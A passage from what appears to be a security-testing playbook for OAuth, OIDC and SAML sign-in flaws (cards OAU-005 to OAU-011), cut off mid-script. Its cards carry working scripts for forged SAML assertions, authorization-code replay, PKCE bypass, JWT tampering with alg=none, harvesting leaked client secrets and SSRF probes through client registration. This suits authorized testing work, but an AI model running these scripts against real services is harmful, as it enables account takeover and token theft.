    R=$(SAML_IRT="$IRT" python3 "$E/tools/saml-forge.py" "$ACS" "$SPID" "$IDP" "$1" "$D/oau005.key" "$D/oau005.crt")
    curl -sS "${HDR[@]}" -b "$J" -c "$J" -o "$J.body" -w "ACS %{http_code} %header{location}  <= $1\n" -X POST "$ACS" --data-urlencode "SAMLResponse=$R"
    curl -sS "${HDR[@]}" -b "$J" "$ME" | head -c 300; echo; sleep 1; }
  sso '<an address of ours that is a member of tenant A>'                 # control: the connection works
  sso '<B address: our account in tenant B, or a personal account>'       # the test
  sso "oau005-new@<a domain of ours that no tenant has verified>"         # provisioning outside A's proved domains
  curl -sS "${HDR[@]}" $B "$ME" | head -c 300; echo                         # B's own view, to compare ids and organisations
  # 4. domain routing: add a domain of ours to tenant A without finishing its proof, then ask the sign-in page where it routes
  curl -sS "${HDR[@]}" -o /dev/null -w '%{http_code} %header{location}\n' -X POST '<the SSO discovery request of the sign-in page>' \
    --data-urlencode "email=probe@<that domain of ours>"
  ```
  A tenant connection over OIDC needs a provider the SP can reach: our own (Keycloak on the `$OOB` host, or a free
  developer tenant of a hosted identity service) with a user whose `email` claim is B's address and
  `email_verified: true`. A start that answers with an HTML form (POST binding) carries the AuthnRequest in its
  `SAMLRequest` field instead of `Location`.
- **Proof:** the ACS response and the identity call returning B's user id, from a session that only an assertion
  signed by tenant A's identity provider created; B's own session showing the same id and no membership of tenant
  A; tenant A's SSO settings (our identity provider, no proved domain that covers B's address). For routing: the
  discovery answer that sends `@<our domain>` to tenant A's identity provider while the domain shows unverified.
- **Not a finding when:** the SP answers "user not in this organisation", or creates a new account inside tenant A
  with its own id and no access to B's data: provisioning into our own tenant is the design. B's address is on a
  domain tenant A has proved: many products then let the organisation take over that domain's accounts on purpose
  ("managed users"). B's account was created by tenant A's own provisioning (SCIM). A domain we added is stored but
  routes nothing until its proof is done. SSO needs a plan we cannot obtain: mark it skipped with the reason.
- **Escalate:** OAU-013 and OAU-014 against tenant B's ACS, with B's SSO connected to a second identity provider
  of ours whose key the test never uses. SSO settings that a member without the admin role, or a request with no
  session, can change turn this into takeover of any tenant (#1049375; BAC-011). Provisioning into another tenant
  (#438306) is the BAC chapter's. OAU-007 is the same e-mail matching through a social provider.

### OAU-006 · The token endpoint redeems an authorization code twice, without its PKCE verifier, or for a client or redirect_uri it was not issued to

| | |
|---|---|
| **Severity** | Medium standalone for a reused code, an unenforced PKCE verifier or a code redeemed by another client, shown on our own codes; High with a code leak that the missing check should have stopped (OAU-002 after the client spent the code, a Referer, a native-app redirect) |
| **Requires** | oauth-provider, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Authentication Bypass by Capture-replay · CWE-294 |
| **Prior art** | #3734676, #824931, #699112, #57603 |

- **Where:** the `token_endpoint` and `code_challenge_methods_supported` from the discovery document; a client we
  registered in the developer settings (we hold its secret and chose its `redirect_uri`) and a second one, or, with
  no registration, a first-party public client (single-page or mobile, its `client_id` in the bundle) whose flow we
  complete as A. Note how each client authenticates: `client_secret_basic`, `client_secret_post`, or none with PKCE.
  `$A` carries A's session on the provider's host.
- **Test:** a code is a one-time credential bound to one client, one `redirect_uri` and, with PKCE, one verifier
  (RFC 6749 §4.1.2 and §4.1.3, RFC 7636). Take a fresh code for A for each check and redeem it once in the wrong
  way: a second time, in parallel, without the verifier its request carried or with a wrong one, with
  `code_challenge_method=plain` where S256 is offered, with another `redirect_uri` or none, and with the second
  client's credentials. Only the correct redemption may return a token.
- **How:**
  ```bash
  AZ='<authorization_endpoint>'; TK='<token_endpoint>'; UI='<userinfo_endpoint>'; RU='<redirect_uri registered for our client>'
  CID='<our client id>'; CA=(-u "$CID:<its secret>")            # a public client instead: CA=(--data-urlencode "client_id=$CID")
  CA2=(-u '<second client of ours>:<its secret>')               # or a first-party public client: CA2=(--data-urlencode 'client_id=<its id>')
  D="$E/evidence/$H/OAU-006"; mkdir -p "$D"
  pk(){ python3 -c 'import base64, hashlib, os; v = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b"=").decode()
  print(v, base64.urlsafe_b64encode(hashlib.sha256(v.encode()).digest()).rstrip(b"=").decode())'; }
  code(){ # code [extra authorize parameters]: a fresh code for A, read from the 302 (A has approved our client once in the browser)
    curl -sS "${HDR[@]}" $A -o /dev/null -w '%header{location}' --get "$AZ" --data-urlencode "client_id=$CID" --data-urlencode response_type=code \
      --data-urlencode "redirect_uri=$RU" --data-urlencode scope=openid --data-urlencode state=oau006 "$@" \
      | python3 -c 'import sys, urllib.parse as u; print(dict(u.parse_qsl(u.urlsplit(sys.stdin.read()).query)).get("code", ""))'; }
  red(){ # red <label> <form fields>: one redemption with our client, saved under the label
    l=$1; shift; printf '%-20s ' "$l"; curl -sS "${HDR[@]}" "${CA[@]}" -o "$D/$l.json" -w '%{http_code} ' -X POST "$TK" -d grant_type=authorization_code "$@"
    jq -c '{error, token_type, scope, at: ((.access_token // "")[0:12])}' "$D/$l.json"; sleep 1; }
  # 1. reuse: one code twice in sequence, then a fresh one five times at once
  C=$(code); red first --data-urlencode "code=$C" --data-urlencode "redirect_uri=$RU"; red second --data-urlencode "code=$C" --data-urlencode "redirect_uri=$RU"
  C=$(code); for i in 1 2 3 4 5; do curl -sS "${HDR[@]}" "${CA[@]}" -o "$D/race$i.json" -X POST "$TK" -d grant_type=authorization_code \
    --data-urlencode "code=$C" --data-urlencode "redirect_uri=$RU" & done; wait; echo "race: $(grep -l '"access_token"' "$D"/race*.json | wc -l) of 5 got a token"
  curl -sS "${HDR[@]}" -H "Authorization: Bearer $(jq -r .access_token "$D/first.json")" -o /dev/null -w 'first token after the reuse: %{http_code}\n' "$UI"
  # 2. PKCE: the challenge was sent; the verifier is then missing, wrong, right (control), and plain is tried where S256 is offered
  read -r V CH <<<"$(pk)"; S=(--data-urlencode "code_challenge=$CH" --data-urlencode code_challenge_method=S256)
  C=$(code "${S[@]}"); red pkce-none --data-urlencode "code=$C" --data-urlencode "redirect_uri=$RU"
  C=$(code "${S[@]}"); red pkce-wrong --data-urlencode "code=$C" --data-urlencode "redirect_uri=$RU" --data-urlencode "code_verifier=$(pk | cut -d' ' -f1)"
  C=$(code "${S[@]}"); red pkce-right --data-urlencode "code=$C" --data-urlencode "redirect_uri=$RU" --data-urlencode "code_verifier=$V"
  C=$(code --data-urlencode "code_challenge=$V" --data-urlencode code_challenge_method=plain)
  red pkce-plain --data-urlencode "code=$C" --data-urlencode "redirect_uri=$RU" --data-urlencode "code_verifier=$V"
  # 3. redirect_uri binding: another value at redemption, then none
  C=$(code); red ru-other --data-urlencode "code=$C" --data-urlencode "redirect_uri=${RU%/}/oau006-other"
  C=$(code); red ru-none --data-urlencode "code=$C"
  # 4. client binding: a code issued to our client, redeemed with the second client's credentials
  C=$(code); curl -sS "${HDR[@]}" "${CA2[@]}" -o "$D/other-client.json" -w 'other-client         %{http_code} ' -X POST "$TK" \
    -d grant_type=authorization_code --data-urlencode "code=$C" --data-urlencode "redirect_uri=$RU"; jq -c '{error, at: ((.access_token // "")[0:12])}' "$D/other-client.json"
  ```
  For a public client, `code` also needs the PKCE parameters wherever the provider requires them; then step 2 is
  the whole test for that client.
- **Proof:** the paired responses with tokens truncated: `second` (or more than one `race*.json`) holding an
  `access_token`; `pkce-none` or `pkce-wrong` returning a token while `pkce-right` is the control; `ru-other`,
  `ru-none` or `other-client` returning a token. Add one `userinfo` call with the token the wrong redemption
  returned, naming A.
- **Not a finding when:** every check returns `invalid_grant` or `invalid_client` and only the control succeeds.
  The second redemption is refused but the first token stays valid: RFC 6749 says the server SHOULD revoke it,
  and that alone is informative. A confidential client without PKCE: the secret authenticates the redemption, and
  missing PKCE there is hardening. `plain` accepted: it matters only if the challenge can leak. A redemption without
  `redirect_uri` succeeds when the authorize request had none either. A long code lifetime with single use is low
  (#1784162 was paid $100).
- **Escalate:** a code that reaches us after the client spent it (OAU-002, a Referer from the landing page)
  becomes a session when reuse works. With no client binding, our own client redeems any code leaked for a
  first-party client, without that client's secret (OAU-001, OAU-002). PKCE not enforced for a public client makes
  native-app and Referer leaks redeemable (#824931). Token families from a race that survive the user's
  revocation of the app: AUT-017.

### OAU-007 · "Sign in with" a provider opens an existing account because its e-mail claim matches an address the provider never verified

| | |
|---|---|
| **Severity** | Critical standalone when an existing account opens with no action by its owner; High when only some account types are affected, such as accounts that never set a password |
| **Requires** | oauth-login, account, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Improper Authentication - Generic · CWE-287 |
| **Prior art** | #1593404, #235139 |

- **Where:** every provider on the sign-in page, and for each one how the client treats a first sign-in by an
  identity it has not seen: a new account (safe), a merge into the account with the same e-mail (the risk), or a
  merge after a password prompt or a mailed confirmation (safe). The providers that can assert an address nobody
  proved: Microsoft Entra ID for a multi-tenant app (the admin of any tenant, us in ours, sets a user's `mail` to
  any value and the `email` claim follows it, the "nOAuth" pattern), GitHub, Discord, X and similar services that
  keep unconfirmed addresses on an account, and any OIDC provider that sends `email_verified: false`. B is our
  account on the target, with an address of ours; the attacker is a separate identity of ours at the provider.
- **Test:** OIDC Core §5.7: only `iss` with `sub` identifies a user; an `email` claim identifies nobody unless the
  provider vouches for it. Give the attacker identity B's address without proving it (set `mail` in our own Entra
  tenant, add the address to the provider account and leave it unconfirmed), then sign in to the target with that
  identity in a clean browser. A client that matches by e-mail opens B's account.
- **How:**
  ```bash
  D="$E/evidence/$H/OAU-007"; mkdir -p "$D" "$E/tools"; LB="$T/auth/microsoft"; ME="$T/api/me"   # the provider's sign-in button URL
  # 1. B before the test: its id and sign-in methods
  curl -sS "${HDR[@]}" $B "$ME" | tee "$D/B-before.json" | head -c 300; echo
  # 2. the attacker identity now carries B's address, unproven; save the claims the provider issues for it
  #    (decode the id_token our own test client receives for that identity, or read the provider's userinfo for it)
  # 3. a clean browser signs in through the target's button as the attacker identity; whom does the target say we are?
  [ -s "$E/tools/sso-login.py" ] || cat > "$E/tools/sso-login.py" <<'PY'
  # sso-login.py <start url> <me url> <png>: fresh profile; do the provider step in the window; prints the landing URL and the me response
  import sys
  from playwright.sync_api import sync_playwright
  start, me, png = sys.argv[1:4]; host = start.split('/')[2]
  with sync_playwright() as p:
      b = p.chromium.launch(headless=False); pg = b.new_context().new_page(); pg.goto(start)
      pg.wait_for_url(lambda u: u.startswith('http') and u.split('/')[2] != host, timeout=60000)     # at the provider
      pg.wait_for_url(lambda u: u.startswith('http') and u.split('/')[2] == host, timeout=300000)    # back after its step
      pg.wait_for_timeout(4000); print(pg.url)
      print(pg.evaluate('u => fetch(u, {credentials: "include"}).then(r => r.text()).catch(e => String(e))', me)[:400])
      pg.screenshot(path=png); b.close()
  PY
  python3 "$E/tools/sso-login.py" "$LB" "$ME" "$D/attacker.png" | tee "$D/attacker-me.txt"
  grep -oE '"(id|user_id|uuid)":"?[A-Za-z0-9-]+' "$D/B-before.json" "$D/attacker-me.txt"
  ```
- **Proof:** B's id in `B-before.json` and the same id in `attacker-me.txt`, from a browser that only signed in
  with the attacker identity; the claims that identity carries (`email` equal to B's address with
  `email_verified: false` or absent, or the provider's settings page showing the address unconfirmed); the
  screenshot and the time of each step. B did nothing.
- **Not a finding when:** the id differs: the client created a new account. The client asks for B's password or
  mails B a link before it links the identity. The provider proved the address (Google, Apple, a confirmed GitHub
  address): nobody can assert it without the mailbox, and the merge is the design. B's account was created through
  that same identity. A provider that lets anyone mark any address verified has a bug of its own (`third-party`),
  unless the provider is the programme's (OAU-015).
- **Escalate:** the reverse order, a password account pre-registered before the owner's first SSO, is AUT-013. An
  SSO path that also skips B's second factor (#1593404): AUT-006. A tenant-configured identity provider asserting
  the address: OAU-005. A Cognito user pool where the user changes `email`: CLD-007. The provider side of the same
  failure: OAU-015.

### OAU-008 · A confidential client's secret, or an identity provider's signing key, ships in a bundle, an app or a public file and still authenticates

| | |
|---|---|
| **Severity** | Medium standalone when a confidential client's secret passes client authentication at the token endpoint; High with a leaked code or refresh token of that client (OAU-002, OAU-006) or a `client_credentials` grant that reads data (API-010); Critical for an identity provider's SAML signing key; None for the secret of a public client |
| **Requires** | — |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Insufficiently Protected Credentials · CWE-522 |
| **Prior art** | #419655, #272824, #796139, #160120 |

- **Where:** the bundles, lazy chunks, source maps and inline configuration of this asset (`client_secret`,
  `clientSecret`, `consumer_secret`, `app_secret`, `GOOGLE_CLIENT_SECRET`, `/env.js`, `/config.json`,
  `__NEXT_DATA__`); the programme's mobile and desktop apps that sign in through the same provider (their packaged
  strings and configuration files); API responses that return client records (#419655); SAML key material served
  by mistake (`*.key`, `*.pem`, a `PRIVATE KEY` block in a bundle or a metadata file). The card runs on every asset
  of this chapter, so it has no gate of its own: any OAuth client, provider or SAML party can ship its secret. A
  secret that signs a help-desk or chat SSO token in the browser is JWT-011; a key used for `client_credentials`
  access to the target's own API is API-010. This card is the secret's role in the user sign-in.
- **Test:** a secret is live when the token endpoint authenticates the client with it. One request with a code
  that cannot exist tells: a wrong secret gets `invalid_client` (usually 401), the right one passes client
  authentication and fails on the code with `invalid_grant` (400). No token is minted and no user is touched. A
  private key is compared offline with the certificate that the metadata publishes.
- **How:**
  ```bash
  D="$E/evidence/$H/OAU-008"; mkdir -p "$D"; J="$E/recon/$H/js"
  # 1. secret-shaped values next to the names that carry them, in bundles, chunks, maps and inline config
  grep -rnoiE "(client[_-]?secret|consumer[_-]?secret|app[_-]?secret|oauth[_-]?secret)[\"' ]*[:=,] *[\"'][A-Za-z0-9._~+/=-]{12,}[\"']" "$J" "$E/recon/$H/" \
    | sort -u | tee "$D/candidates.txt" | cut -c1-200 | head -30
  grep -rnoE -e '-----BEGIN (RSA |EC |ENCRYPTED )?PRIVATE KEY-----' "$J" "$E/recon/$H/" | sort -u | head
  unzip -p '<the programme app .apk>' | strings -n 12 | grep -iE 'client_?secret|consumer_?secret|app_?secret' | sort -u | head
  # 2. the oracle: a code that cannot exist, with a wrong secret (control) and with the found one, in both encodings; nothing is minted
  TK='<token_endpoint of the provider this client uses>'; CID='<client_id found next to the secret>'; CS='<the secret>'; RU='<its registered redirect_uri>'
  for s in oau008-wrong-secret "$CS"; do for enc in basic post; do
    if [ $enc = basic ]; then AU=(-u "$CID:$s"); else AU=(--data-urlencode "client_id=$CID" --data-urlencode "client_secret=$s"); fi
    printf '%-6s %-6s ' "$enc" "$([ "$s" = "$CS" ] && echo found || echo wrong)"
    curl -sS "${HDR[@]}" "${AU[@]}" -X POST "$TK" -d grant_type=authorization_code -d code=oau008-no-such-code \
      --data-urlencode "redirect_uri=$RU" -w ' %{http_code}' | tr -d '\n' | cut -c1-160; echo; sleep 1
  done; done | tee "$D/oracle.txt"
  # 3. a private key: does its public half match the certificate that the metadata publishes?
  openssl pkey -in '<found key file>' -pubout | sha256sum
  curl -sS "${HDR[@]}" '<IdP or SP metadata URL>' | grep -oE 'X509Certificate>[^<]+' | head -1 | cut -d'>' -f2 | fold -w 64 \
    | { echo '-----BEGIN CERTIFICATE-----'; cat; echo '-----END CERTIFICATE-----'; } | openssl x509 -pubkey -noout | sha256sum
  ```
  When the token endpoint belongs to a third party (Google, GitHub, Facebook), the four oracle requests go to it
  exactly as the client's own server would send them; the scope guard blocks that host until the operator lists it
  as infrastructure, which is the operator's decision.
- **Proof:** the file and line where the secret ships, with the secret shown as its first and last four
  characters; `oracle.txt` with `invalid_client` for the wrong secret and `invalid_grant` for the found one in the
  same encoding; for a key, the two equal hashes. State what the secret enables for that client from the
  provider's documentation (redeeming its codes, refreshing its tokens, the grants it may use). Nothing minted,
  nothing signed.
- **Not a finding when:** the client is public: a mobile, desktop or single-page client registered as public,
  for which the provider ignores the secret or requires PKCE (Google documents the secret of installed apps as not
  confidential). The oracle answers the same for both values: the secret is dead, or the provider does not
  authenticate this client. The value is a client id, a publishable key or a browser API key (INF-004). The secret
  belongs to a sandbox or test client the policy excludes.
- **Escalate:** a live secret makes any code leaked for that client (OAU-002, OAU-006) redeemable by us without
  the client's callback, and its refresh tokens usable. `client_credentials` with it is API-010: stop at the
  granted scope. An identity provider's signing key would sign any NameID with OAU-013's forge script; do not use
  it, the matching hashes are the proof. A secret in a public repository: INF-015.

### OAU-009 · The sign-in endpoint that receives the provider's token signs in an identity that token does not prove

| | |
|---|---|
| **Severity** | Critical standalone when the identity comes from a field beside the token, or an altered or unsigned token is accepted: any account opens; High when a token the provider issued to another client opens the user's account (the victim signed in once to an app we run); Low when an old token of this client is accepted again |
| **Requires** | oauth-login, two-accounts, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Improper Authentication - Generic · CWE-287 |
| **Prior art** | #739321, #3489490, #1889161, #86504 |

- **Where:** the request in which the browser or app hands the provider's token to the backend: Google's sign-in
  button and One Tap (`credential` posted to the backend), Apple's `form_post` callback (`id_token` with `code`),
  `POST /api/auth/<provider>` with an `id_token` or `access_token` from mobile and single-page clients, implicit or
  hybrid callbacks that receive an `id_token`, and token-login grants (`urn:ietf:params:oauth:grant-type:jwt-bearer`,
  token exchange). Find it in A's sign-in in the proxy history and in the bundles (`credential`, `idToken`,
  `id_token`, `accessToken`, `provider_token`). A code flow whose ID token travels from the provider's token
  endpoint to the backend directly has nothing to alter: skip it.
- **Test:** the backend must verify the token itself (the signature against the provider's published keys, `iss`,
  `aud` or `azp` equal to this application's client id, or for an access token the provider's introspection or
  debug endpoint naming this app, `exp`, and the `nonce` it gave this browser) and take `sub` and `email` from the
  verified token only. Try, cheapest first: (1) A's valid token with B's identity in fields beside it; (2) A's
  token with `sub` and `email` changed to B's, signature kept, then with `alg` set to `none`; (3) B's token from
  the same provider, issued to a client we registered there; (4) an expired token, or one from an earlier sign-in.
- **How:**
  ```bash
  D="$E/evidence/$H/OAU-009"; mkdir -p "$D"; CT='Content-Type: application/json'; ME="$T/api/me"
  LG="$T/api/auth/google"; F=id_token     # the backend sign-in request from A's sign-in, and the field that carries the token
  TA='<A token from that request>'; EB='<B e-mail>'; SB='<B sub at the provider, from a token of B>'
  try(){ # try <label> <json body>: post it, keep the cookies, ask who we are
    curl -sS "${HDR[@]}" -c "$D/$1.jar" -o "$D/$1.body" -w "$1 %{http_code} " -X POST "$LG" -H "$CT" -d "$2"
    curl -sS "${HDR[@]}" -b "$D/$1.jar" "$ME" | head -c 200; echo; sleep 1; }
  try control "{\"$F\":\"$TA\"}"                                              # A
  # 1. the identity beside the token
  try beside-email "{\"$F\":\"$TA\",\"email\":\"$EB\"}"
  try beside-ids "{\"$F\":\"$TA\",\"user_id\":\"$SB\",\"uid\":\"$SB\",\"provider_user_id\":\"$SB\",\"sub\":\"$SB\"}"
  # 2. A's token carrying B's sub and email: the signature kept, then alg none
  jwtx(){ SB="$SB" EB="$EB" python3 - "$TA" "$1" <<'PY'
  import base64, json, os, sys
  t, mode = sys.argv[1:3]; h, p, s = t.split('.')
  d = lambda x: json.loads(base64.urlsafe_b64decode(x + '=' * (-len(x) % 4)))
  e = lambda o: base64.urlsafe_b64encode(json.dumps(o, separators=(',', ':')).encode()).rstrip(b'=').decode()
  c = d(p); c.update(sub=os.environ['SB'], email=os.environ['EB'])
  print(e(dict(d(h), alg='none')) + '.' + e(c) + '.' if mode == 'none' else h + '.' + e(c) + '.' + s)
  PY
  }
  try claims-changed "{\"$F\":\"$(jwtx keep)\"}"
  try alg-none "{\"$F\":\"$(jwtx none)\"}"
  # 3. B's token from OUR client at the same provider: B signs in once to our own registered client in the browser
  cat > "$D/own-client.py" <<'PY'
  # own-client.py <authorize URL of our client> <its redirect_uri>: sign in as B in the window; prints the id_token or access_token
  import sys, urllib.parse as u
  from playwright.sync_api import sync_playwright
  url, ru = sys.argv[1:3]
  with sync_playwright() as p:
      b = p.chromium.launch(headless=False); c = b.new_context(); c.route(ru + '**', lambda r: r.fulfill(body='oau009'))
      pg = c.new_page(); pg.goto(url); pg.wait_for_url(ru + '**', timeout=300000)
      f = dict(u.parse_qsl(u.urlsplit(pg.url).fragment)); print(f.get('id_token') or f.get('access_token', '')); b.close()
  PY
  OC='<our client id at the provider>'; OR="https://$OOB/oau009-cb"      # registered for our client; the browser route answers it
  TB=$(python3 "$D/own-client.py" "<provider authorize URL>?client_id=$OC&response_type=id_token&scope=openid%20email&nonce=oau009&redirect_uri=$(jq -rn --arg v "$OR" '$v|@uri')" "$OR")
  try other-client "{\"$F\":\"$TB\"}"
  # 4. a token of A from an earlier sign-in, or one past its exp
  try old-token "{\"$F\":\"<an earlier token of A>\"}"
  ```
  A backend that takes the provider's access token rather than an ID token (Facebook-style `access_token` logins)
  gets step 3 with `response_type=token`. The route in `own-client.py` answers our redirect inside the browser, so
  B's token never leaves our machine.
- **Proof:** the `try` line that returns B's id for a token the endpoint should have refused, with the decoded
  header and claims of what was sent (B's e-mail beside A's token, `aud` equal to our client id, the changed claims
  or `alg: none`), next to `control` returning A and B's own `/api/me`.
- **Not a finding when:** every variant is refused or returns A: the extra fields are ignored and the token is
  checked. The target registered several client ids of its own (web, iOS, Android) and accepts all of them as
  audiences: the design, and ours cannot be among them. The ID token never passes through the browser. An old token
  accepted within its own `exp` by a client that sends no `nonce`: low, report it only with a way to obtain the
  token.
- **Escalate:** JWT-003 (HS256 with the provider's public key), JWT-006 (embedded `jwk`) and JWT-007 (`jku`)
  aimed at this endpoint. A backend that fetches keys from the token's own `iss` accepts our issuer and our keys:
  Critical. A token that is honest but carries an e-mail nobody proved: OAU-007. A token leak (OAU-003) that this
  endpoint turns into a session.

### OAU-010 · A token the user approved for some scopes is honoured for more: widened at the code exchange or refresh, or exchanged for a full session

| | |
|---|---|
| **Severity** | High standalone when a third-party token gains write scopes or a full web session the user never granted; Medium when the extra scope reads non-public data; Low when the consent screen under-describes scopes the client already holds |
| **Requires** | oauth-provider, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Improper Authorization · CWE-285 |
| **Prior art** | #3999856, #434763, #1031240, #1711938 |

- **Where:** a client we registered at the provider and its documented scopes (the narrowest read scope and a
  wider write or admin scope), the consent screen, the `scope` field of token responses, `introspection_endpoint`
  and `userinfo`, A's "authorized applications" page (to revoke between runs), and the endpoints that turn a bearer
  token into a first-party session or a broader token: token exchange (RFC 8693), "log in with token" hand-offs of
  the mobile and desktop apps (`/my/login_option` in #3999856).
- **Test:** the provider must grant only what the user approved for this client, at every later step. As A,
  approve the narrowest scope once, then ask for more without a new approval: a wider `scope` at the code
  exchange, a wider `scope` at refresh (RFC 6749 §6 forbids it), a token exchange for the wider scope, and every
  hand-off that answers a bearer token with a session cookie. Then compare what the consent screen shows with what
  the token holds when the scope is written oddly. A resource route that ignores a token's scope is API-015: run it
  there with this token.
- **How:**
  ```bash
  AZ='<authorization_endpoint>'; TK='<token_endpoint>'; IN='<introspection_endpoint>'; CID='<our client id>'; CS='<its secret>'; RU='<its redirect_uri>'
  NARROW='<narrowest documented scope>'; WIDE='<a wider scope: write, api, admin>'; D="$E/evidence/$H/OAU-010"; mkdir -p "$D"
  # 0. A in the browser: revoke our client on the authorized-applications page, approve it for $NARROW only, screenshot the consent screen
  code(){ curl -sS "${HDR[@]}" $A -o /dev/null -w '%header{location}' --get "$AZ" --data-urlencode "client_id=$CID" --data-urlencode response_type=code \
    --data-urlencode "redirect_uri=$RU" --data-urlencode "scope=$NARROW" --data-urlencode state=oau010 \
    | python3 -c 'import sys, urllib.parse as u; print(dict(u.parse_qsl(u.urlsplit(sys.stdin.read()).query)).get("code", ""))'; }
  tok(){ n=$1; shift; curl -sS "${HDR[@]}" -u "$CID:$CS" -o "$D/$n.json" -X POST "$TK" "$@"; printf '%-10s ' "$n"
    jq -c '{scope, error, refresh: (.refresh_token != null)}' "$D/$n.json"; sleep 1; }
  # 1. a wider scope asked at the code exchange, then at refresh
  tok exchange -d grant_type=authorization_code --data-urlencode "code=$(code)" --data-urlencode "redirect_uri=$RU" --data-urlencode "scope=$NARROW $WIDE"
  tok refresh -d grant_type=refresh_token --data-urlencode "refresh_token=$(jq -r .refresh_token "$D/exchange.json")" --data-urlencode "scope=$NARROW $WIDE"
  AT=$(jq -r '.access_token // empty' "$D/refresh.json"); AT=${AT:-$(jq -r .access_token "$D/exchange.json")}
  # 2. a token exchange for the wider scope
  tok exchange2 -d grant_type=urn:ietf:params:oauth:grant-type:token-exchange --data-urlencode "subject_token=$AT" \
    -d subject_token_type=urn:ietf:params:oauth:token-type:access_token --data-urlencode "scope=$WIDE"
  # 3. what the token really holds: the provider's view, then one route on A's own data that only $WIDE allows
  curl -sS "${HDR[@]}" -u "$CID:$CS" -X POST "$IN" --data-urlencode "token=$AT" | jq -c '{active, scope, client_id}'
  curl -sS "${HDR[@]}" -H "Authorization: Bearer $AT" -o "$D/outside.json" -w 'route that needs the wider scope: %{http_code}\n' "$T/<route on A's own data>"
  # 4. hand-offs that answer a bearer token with a first-party session
  grep -rhoE "[\"'](/[A-Za-z0-9_/.-]*(login_option|token_login|login_with_token|from_token|handoff|session/token|sso/token|exchange)[A-Za-z0-9_/.-]*)[\"']" \
    "$E/recon/$H/js/" | tr -d "\"'" | sort -u | tee "$D/handoffs.txt"
  while read -r u; do curl -sS "${HDR[@]}" -H "Authorization: Bearer $AT" -o /dev/null -w "%{http_code} %header{set-cookie} <= $u\n" "$T$u" \
    | cut -c1-160; sleep 1; done < "$D/handoffs.txt"
  ```
  Then the consent screen: B, who never approved our client, opens the authorize URL with the scope written as
  `scope=$NARROW&scope=$WIDE`, as `$NARROW,$WIDE`, and as `x $NARROW $WIDE`. Screenshot each screen, approve,
  redeem, and compare the scopes listed on the screen with the token's `scope` and with introspection.
- **Proof:** the consent screenshot listing only the narrow scope, the token response or introspection showing the
  wider one, and one request on A's own data that only the wider scope permits, succeeding. For a hand-off: its
  `Set-Cookie` and one page of the web application loaded with that cookie, naming A.
- **Not a finding when:** the token response echoes the requested scope while introspection and the routes enforce
  the approved one. The wider scope was approved for this client before: consent is remembered per client, so
  revoke before each run. The provider documents incremental authorization (Google's `include_granted_scopes`) and
  the user approved that scope earlier. A hand-off reserved for first-party clients refuses our client's token. A
  refresh that asks for a narrower scope is allowed.
- **Escalate:** a session minted from a third-party token that outlives the user's revocation of the app
  (#3999856): AUT-017. The widest scope reachable is what the leaks of OAU-002, OAU-003 and OAU-012 are worth.
  Resource routes that ignore the scope: API-015.

### OAU-011 · The provider fetches a URL we put in a client registration or an authorization request, from inside its network

| | |
|---|---|
| **Severity** | High when the response of an internal address or cloud metadata surfaces through the registration, consent or token flow; Medium for blind internal reach with an oracle; None for an external callback alone |
| **Requires** | oauth-provider, oob |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Server-Side Request Forgery (SSRF) · CWE-918 |
| **Prior art** | #398799, #104620 |

- **Where:** `registration_endpoint` (RFC 7591: open, or behind an initial access token or a developer account),
  `request_uri_parameter_supported` and `require_request_uri_registration` from the discovery document, the
  developer console's app form (logo, website, privacy and terms URLs, JWKS URL, sector identifier, logout and
  notification URLs), and identity-provider features that take a metadata or JWKS URL for a federated client. A
  fetch can fire at registration (`sector_identifier_uri` is read to validate `redirect_uris`), on the consent page
  (a `logo_uri` the server proxies), at the token endpoint (`jwks_uri` for `private_key_jwt`) or at the authorize
  endpoint (`request_uri`).
- **Test:** put a label of its own on `$OOB` in every URL field, trigger each of those moments once, and read
  which labels arrive, from which address and with which User-Agent. A label that arrives from the provider's
  network is a fetcher, and SSR-002 to SSR-005 then decide what it reaches. A label fetched by our own browser (the
  consent page loading the logo directly) is not.
- **How:**
  ```bash
  D="$E/evidence/$H/OAU-011"; mkdir -p "$D"; DISC="$E/recon/$H/disc_.well-known_openid-configuration.json"; CT='Content-Type: application/json'
  REG=$(jq -r '.registration_endpoint // empty' "$DISC"); AZ=$(jq -r .authorization_endpoint "$DISC"); TK=$(jq -r .token_endpoint "$DISC")
  jq -c '{registration_endpoint, request_uri_parameter_supported, require_request_uri_registration}' "$DISC"
  # 1. dynamic registration with each fetchable URI on its own label (add -H "Authorization: Bearer <initial access token>" if required)
  cat > "$D/reg.json" <<EOF
  {"client_name": "oau011", "redirect_uris": ["https://$OOB/oau011-cb"], "token_endpoint_auth_method": "private_key_jwt",
   "logo_uri": "https://oau011-logo.$OOB/l.png", "jwks_uri": "https://oau011-jwks.$OOB/jwks.json",
   "sector_identifier_uri": "https://oau011-sector.$OOB/s.json", "request_uris": ["https://oau011-requris.$OOB/r.jwt"],
   "client_uri": "https://oau011-client.$OOB/", "policy_uri": "https://oau011-policy.$OOB/", "tos_uri": "https://oau011-tos.$OOB/",
   "initiate_login_uri": "https://oau011-init.$OOB/", "backchannel_logout_uri": "https://oau011-bcl.$OOB/"}
  EOF
  curl -sS "${HDR[@]}" -X POST "$REG" -H "$CT" --data-binary @"$D/reg.json" -o "$D/reg-resp.json" -w 'register %{http_code}\n'
  CID=$(jq -r .client_id "$D/reg-resp.json"); jq -c '{client_id, registration_client_uri, error, error_description}' "$D/reg-resp.json"
  # 2. the authorize endpoint loads a request object by reference
  curl -sS "${HDR[@]}" -o "$D/requri.body" -w 'request_uri %{http_code}\n' --get "$AZ" --data-urlencode "client_id=$CID" \
    --data-urlencode response_type=code --data-urlencode scope=openid --data-urlencode "request_uri=https://oau011-requri.$OOB/r.jwt"
  # 3. the consent page for our client, as A, so a server-side logo fetch fires
  curl -sS "${HDR[@]}" $A -o "$D/consent.html" --get "$AZ" --data-urlencode "client_id=$CID" --data-urlencode response_type=code \
    --data-urlencode "redirect_uri=https://$OOB/oau011-cb" --data-urlencode scope=openid; grep -oiE '<img[^>]+>' "$D/consent.html" | head -3
